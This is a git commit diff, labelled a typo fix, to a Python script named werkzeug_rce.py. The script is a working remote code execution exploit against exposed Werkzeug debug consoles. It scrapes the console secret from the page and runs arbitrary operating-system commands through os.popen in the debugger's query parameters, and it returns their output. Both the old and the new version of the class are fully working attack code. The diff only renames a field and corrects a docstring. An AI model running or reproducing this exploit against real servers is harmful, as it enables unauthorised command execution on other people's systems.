97d6670d3750476e460abcb950e16ac2d537b6c8
its0x08 <m.thg@icloud.com>
2022-08-02 15:18:57 +0200

    fix: Minor typo fix

--- werkzeug_rce.py
+++ werkzeug_rce.py
@@ -1,23 +1,25 @@
 '''Parser class'''
 from requests_html import HTMLSession
 
+
 class DebugRce:
 	'''RCE class'''
-	def __init__(self, url) -> None:
+
+	def __init__(self, host) -> None:
 		'''init method'''
-		self.url = url
+		self.host = host
 		self.req = HTMLSession()
 		self.secret = self.req.get(
-			f'http://{self.url}/console').html.find('script')[1].text.split(' ')[-1][1:-2]
+			f'http://{self.host}/console').html.find('script')[1].text.split(' ')[-1][1:-2]
 
 	def exec(self, cmd) -> list:
-		'''.exec() method used to execute arbitrary comands'''
+		'''.exec() method used to execute arbitrary commands'''
 
 		cmd = f'''__import__('os').popen('{cmd}').read();'''
 		res = self.req.get(
-			f'http://{self.url}/console?__debugger__=yes&cmd={cmd}&frm=0&s={self.secret}')
+			f'http://{self.host}/console?__debugger__=yes&cmd={cmd}&frm=0&s={self.secret}')
 		return res.html.text[1:-1].split('\\n')[0:-1]
 
-	def show_url(self):
-		'''.show_url() method used to show URL'''
-		return self.url
+	def show_host(self):
+		'''.show_host() method used to show host'''
+		return self.host
